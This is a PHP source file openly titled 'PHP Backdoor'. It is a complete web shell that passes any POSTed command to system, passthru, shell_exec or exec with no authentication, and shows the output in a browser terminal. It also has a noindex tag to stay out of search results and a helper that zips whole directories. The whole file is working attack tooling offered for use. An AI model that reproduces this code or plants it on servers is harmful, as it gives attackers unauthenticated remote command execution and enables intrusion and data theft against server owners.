<?php
/*

	 ██████╗ ██████╗  ██████╗██╗  ██╗    ██████╗ ███████╗██╗   ██╗    ████████╗███████╗ █████╗ ███╗   ███╗
	██╔════╝ ╚════██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔════╝██║   ██║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
	██║  ███╗ █████╔╝██║     █████╔╝     ██║  ██║█████╗  ██║   ██║       ██║   █████╗  ███████║██╔████╔██║
	██║   ██║ ╚═══██╗██║     ██╔═██╗     ██║  ██║██╔══╝  ╚██╗ ██╔╝       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
	╚██████╔╝██████╔╝╚██████╗██║  ██╗    ██████╔╝███████╗ ╚████╔╝        ██║   ███████╗██║  ██║██║ ╚═╝ ██║
	 ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝  ╚═══╝         ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

	 Project name: PHP Backdoor
	 Description: Web-based application that allows to execute terminal commands on a server directly from a browser
	 Authors: Jarek <jarek@g3ck.com>, G3ck Dev Team <dev@g3ck.com
	 Github: https://g3ck.github.io/PHP-Backdoor
	 License: MIT
*/
// Get current command
// if command posted
if (isset( $_POST['command'])):
	$command = $_POST['command'];
	$command = trim($command," ");
else:
// if command not posted. Set '';
	$command = '';
endif;
// decode answer array
function answer($data){
	die(json_encode($data));
}

function archive($path){

	// Get real path for our folder
	$rootPath = $path;

	// Initialize archive object
	$zip = new ZipArchive();
	$zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($rootPath),
		RecursiveIteratorIterator::LEAVES_ONLY
	);

	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		if (!$file->isDir())
		{
			// Get real and relative path for current file
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($rootPath) + 1);

			// Add current file to archive
			$zip->addFile($filePath, $relativePath);
		}
	}

	// Zip archive will be created only after closing object
	$zip->close();
	$answer = array("Archive created");
	answer($answer);
}


// Check if is ajax request. If yes, start terminal command
if (isset( $_POST['command'])):

	$command = $_POST['command'];

		// Check functions
		// Try: system
		if(function_exists('system'))
		{
			ob_start();
			system($command , $return_var);
			$output = ob_get_contents();
			ob_end_clean();
		}
		// Try: passthru
		else if(function_exists('passthru'))
		{
			ob_start();
			passthru($command , $return_var);
			$output = ob_get_contents();
			ob_end_clean();
		}
		// Try: shell_exec
		else if(function_exists('shell_exec'))
		{
			$output = shell_exec($command);
		}
		// Try: exec
		else if(function_exists('exec'))
		{
			exec($command , $output , $return_var);
			$output = implode("" , $output);
		}
		// Try: terminal_exec
		else if(function_exists('terminal_exec'))
		{
			$output = terminal_exec($command) ;
		}
		// No function exists
		else
		{
			$output = 'Command execution not possible on this server';
		}
		// No output
		if ($output == null):
			$answer = array(
				'Unknown command',
			);
			answer($answer);
		// Create an answer
		else:
			$output = nl2br($output);
			$answer = array(
				$output
			);
			answer($answer);
		endif;
else:
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="language" content="en">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" CONTENT="noindex,nofollow">
	<meta name="distribution" content="IU">
	<meta name="copyright" content="G3ck Dev Team, dev@g3ck.com">
	<meta name="author" content="Jarek, jarek@g3ck.com">
	<meta name="author" content="Jarek, jarek@g3ck.com">
	<meta name="owner" content="G3ck Dev Team, dev@g3ck.com">
	<title>PHP Terminal [g3ck.com]</title>
	<style>

			* {
				font-family: monospace
			}
			body,
			html {
				height: 100%;
				background: #000;
				font-size: 15px;
				color: #fff;
				padding: 0;
				margin: 0;
				overflow: hidden;
			}

			body {
				overflow-x: hidden;
				overflow-y: auto
			}
			section#terminal {
				margin: 15px
			}

			#console {
				list-style: none;
				padding: 0;
				margin: 0
			}

			#console li {
				position: relative;
				width: 99%;
				border: none;
				color: #fff;
				margin-bottom: 1px;
				color: #1dff1d;
				padding: 2px 0 2px 15px;
				cursor: default !important;
			}

			#console li:not(.answer) {
			}

			#console li::before {
				content: " ~ ";
				position: absolute;
				left: 0;
				top: 1px;
				color: green
			}

			#console li.answer {
				color: #ffd623;
				font-weight: 400
			}

			#console li.answer.error {
				color: #ff2323
			}

			#input {
				padding: 2px 0 2px 15px;
				position: relative
			}

			#input::before {
				content: " ~ ";
				position: absolute;
				left: 0;
				top: 1px;
				color: green
			}

			#input::before {
				transition-property: transform;
				transition-duration: 1s
			}

			#input.waiting::before {
				animation-name: rotate;
				animation-duration: 2s;
				animation-iteration-count: infinite;
				animation-timing-function: linear;
				color: #fff
			}
			@keyframes rotate {
				from {
					transform: rotate(0)
				}
				to {
					transform: rotate(360deg)
				}
			}
			#input #command {
				width: 100%;
				background-color: transparent;
				border: none;
				color: #fff;
				font-size: 15px;
				color: #fff;
				font-family: 'Roboto Mono', monospace
			}

	</style>
</head>
<body>
	<section id="terminal">
		<ul id="console"></ul>
		<div id="input">
			<input id="command" type="text" value="">
		</div>
	</section>
	<script>
		// Log command into console
		function log(input){
			var div = document.getElementById('console');
			div.innerHTML += '<li>' + input + '</li>';
		}
		// Create a answer log
		function answer(input, type=''){
			var div = document.getElementById('console');
			div.innerHTML += '<li class="answer ' + type + '">' + input + '</li>';
		}
		// Welcome message
		function welcome(){
			var div = document.getElementById('console');
			div.innerHTML += '<li class="answer">PHP Backdoor by G3ck.com</li>';
			div.innerHTML += '<li class="answer">Licensed under MIT License</li>';
		}
		// Submit a command by jjax
		function ajax(command){
			var div = document.getElementById('console');
			var xhttp = new XMLHttpRequest();
		    xhttp.onreadystatechange = function() {
		      if (this.readyState == 4 && this.status == 200) {
				respond = this.responseText;
				function IsJsonString(str) {
				  try {
				    var json = JSON.parse(str);
				    return (typeof json === 'object');
				  } catch (e) {
				    return false;
				  }
				}
				if (IsJsonString(respond)){
						respond = JSON.parse(respond);
				  //the json is ok
				  for (var key in respond) {
  				    if (respond.hasOwnProperty(key)) {
  					   displayed = true;
  				       answer(respond[key]);
  				    }
  				 }
				}else{
				  //the json is not ok
				  answer('Unexpected response format');
				}
		      }

		    };
		    xhttp.open("POST", window.location.href, true);
		    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		    xhttp.send("command=" + command);
		}
		// Get welcome message
		welcome();
		// Submit command
		document.getElementById("command").addEventListener("keyup", function(e){
			var valueThis = document.getElementById("command").value;
			// On enter click
			if (e.keyCode == 13) {
				valueThis = valueThis.toLowerCase();
				if (valueThis != ''){
					// Log user command into console
					log(valueThis);
					// Custom command
					// Clear terminal screan
					if (valueThis == 'cls'){
						document.getElementById("console").innerHTML = '';
					// Reset terminal
					} else if (valueThis == 'reset' || valueThis == 'res'){
						document.getElementById("console").innerHTML = '';
						welcome();
					// Hello
					} else if (valueThis == 'hello' || valueThis == 'hi'){
						answer('Hello')
					// Response
					} else{
						ajax(valueThis);
					}
					window.scrollTo(0,document.body.scrollHeight);
					document.getElementById("command").value = '';;
				}
				return false;
			}
		});
	document.getElementById("command").value = '';
	setInterval(function(){ document.getElementById("command").focus(); }, 500);
	</script>
</body>
</html>
<?php endif; ?>
